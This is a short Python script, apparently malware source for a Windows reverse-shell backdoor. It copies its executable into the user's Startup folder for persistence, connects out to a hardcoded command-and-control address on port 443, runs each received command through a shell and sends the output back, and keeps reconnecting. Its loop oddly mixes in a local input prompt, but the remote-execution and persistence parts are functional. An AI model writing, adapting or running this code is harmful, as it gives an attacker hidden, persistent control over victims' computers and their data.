import os, threading, socket, subprocess, time

CCIP = '192.168.1.6'
CCPORT = 443

def autorun():
    filen = os.path.basename(__file__)
    exe_file = filen.replace('.py','.exe')
    os.system("copy {} \%APPDATA%\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup".format(exe_file))
    
def conn(CCIP, CCPORT):
    try :
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((CCIP, CCPORT))
        return client
    except Exception as e:
        print(e)

def cmd(client, data):
    try :
        proc = subprocess.Popen(data, shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
        output = proc.stdout.read() + proc.stderr.read()
        client.send(output + b"\n")
    except Exception as e:
        print(e)
        
def cli(client):
    try:
        while True:
            # Receive commands from the client
            data = client.recv(1024).decode().strip()
            if data == "/:kill":
                return
            else:
                # Execute the received command
                threading.Thread(target=cmd, args=(client, data)).start()

            # Send commands from host to client
            user_input = input("Enter command for the client (/:kill to exit): ")
            client.send(user_input.encode())
            if user_input == "/:kill":
                break
            time.sleep(2)  # Adjust as needed
    except Exception as e:
        print(e)

if __name__ == "__main__":
    autorun()
    while True:
        client = conn(CCIP, CCPORT)
        if client:
            cli(client)
        else:
            time.sleep(3)
            
        
    
    
    
